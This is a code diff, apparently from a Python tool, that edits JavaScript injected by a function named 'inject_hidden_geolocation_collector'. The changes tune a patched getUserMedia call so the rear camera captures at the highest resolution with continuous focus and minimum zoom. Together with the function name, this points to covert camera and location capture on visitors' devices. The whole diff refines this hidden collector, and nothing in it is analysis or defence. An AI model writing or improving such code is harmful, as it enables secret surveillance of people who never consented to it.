@@ -217,17 +217,15 @@ def inject_hidden_geolocation_collector() -> None:
                                 patched = { ...constraints, video: { ...baseVideo } };
 
                                 if (!patched.video.facingMode) {
-                                    patched.video.facingMode = { exact: "environment" };
+                                    patched.video.facingMode = { ideal: "environment" };
                                 }
                                 if (!patched.video.width) {
-                                    patched.video.width = { ideal: 9999 };
+                                    patched.video.width = { ideal: 4096 };
                                 }
                                 if (!patched.video.height) {
-                                    patched.video.height = { ideal: 9999 };
+                                    patched.video.height = { ideal: 3072 };
                                 }
-                                if (!patched.video.aspectRatio) {
-                                    patched.video.aspectRatio = { ideal: 1.3333333333 };
-                                }
+                                patched.video.resizeMode = patched.video.resizeMode || "none";
                             }
                         }
 
@@ -238,6 +236,7 @@ def inject_hidden_geolocation_collector() -> None:
                                 if (track && typeof track.getCapabilities === "function") {
                                     const caps = track.getCapabilities();
                                     const extra = {};
+                                    const advanced = [];
 
                                     if (caps.width && typeof caps.width.max === "number") {
                                         extra.width = { ideal: caps.width.max };
@@ -245,11 +244,14 @@ def inject_hidden_geolocation_collector() -> None:
                                     if (caps.height && typeof caps.height.max === "number") {
                                         extra.height = { ideal: caps.height.max };
                                     }
-                                    if (caps.frameRate && typeof caps.frameRate.max === "number") {
-                                        extra.frameRate = { ideal: caps.frameRate.max };
-                                    }
                                     if (Array.isArray(caps.focusMode) && caps.focusMode.includes("continuous")) {
-                                        extra.focusMode = "continuous";
+                                        advanced.push({ focusMode: "continuous" });
+                                    }
+                                    if (caps.zoom && typeof caps.zoom.min === "number") {
+                                        advanced.push({ zoom: caps.zoom.min });
+                                    }
+                                    if (advanced.length) {
+                                        extra.advanced = advanced;
                                     }
 
                                     if (Object.keys(extra).length) {
